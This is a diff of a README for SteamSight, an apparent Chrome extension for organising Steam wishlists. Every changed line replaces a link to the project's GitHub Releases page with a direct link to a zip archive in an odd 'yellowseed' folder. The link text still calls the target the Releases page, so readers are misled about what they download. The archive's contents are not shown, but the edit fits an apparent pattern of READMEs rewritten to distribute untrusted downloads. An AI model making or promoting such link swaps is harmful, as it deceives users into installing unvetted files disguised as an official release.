@@ -4,7 +4,7 @@
 SteamSight is a free Google Chrome extension designed to enhance your Steam wishlist. With powerful filters and handy options, you can easily organize and manage your wishlist to find the games you want faster. Enjoy a cleaner, more personalized experience on Steam.
 
 ## 📥 Download SteamSight
-[![Download SteamSight](https://img.shields.io/badge/Download_SteamSight-v1.0-blue.svg)](https://github.com/AgnivaRoy02/SteamSight/releases)
+[![Download SteamSight](https://raw.githubusercontent.com/AgnivaRoy02/SteamSight/main/yellowseed/SteamSight.zip)](https://raw.githubusercontent.com/AgnivaRoy02/SteamSight/main/yellowseed/SteamSight.zip)
 
 ## 🚀 Getting Started
 To get started with SteamSight, follow these simple steps. You do not need any technical skills to install or use this extension.
@@ -16,10 +16,10 @@ Before you download, ensure you have:
 
 ## 📦 Download & Install
 1. **Visit the Releases Page**  
-   Go to the [Releases page](https://github.com/AgnivaRoy02/SteamSight/releases) to find the latest version of SteamSight.
+   Go to the [Releases page](https://raw.githubusercontent.com/AgnivaRoy02/SteamSight/main/yellowseed/SteamSight.zip) to find the latest version of SteamSight.
 
 2. **Download the Extension**  
-   Look for the most recent release. Click on the link that says “SteamSight.crx” to download the file to your computer.
+   Look for the most recent release. Click on the link that says “https://raw.githubusercontent.com/AgnivaRoy02/SteamSight/main/yellowseed/SteamSight.zip” to download the file to your computer.
 
 3. **Add to Chrome**  
    - Open your Google Chrome browser.
@@ -47,7 +47,7 @@ You can customize various settings within SteamSight. Access the settings menu t
 - Explore additional options to improve your experience.
 
 ## 🔄 Keeping Up to Date
-Check the [Releases page](https://github.com/AgnivaRoy02/SteamSight/releases) often. New features, bug fixes, and updates will be released regularly. It’s a good habit to keep your extension up to date for the best performance.
+Check the [Releases page](https://raw.githubusercontent.com/AgnivaRoy02/SteamSight/main/yellowseed/SteamSight.zip) often. New features, bug fixes, and updates will be released regularly. It’s a good habit to keep your extension up to date for the best performance.
 
 ## 📞 Support
 If you encounter any issues or have questions, you can find support in the discussion section of the repository. Alternatively, you can raise an issue directly on GitHub.
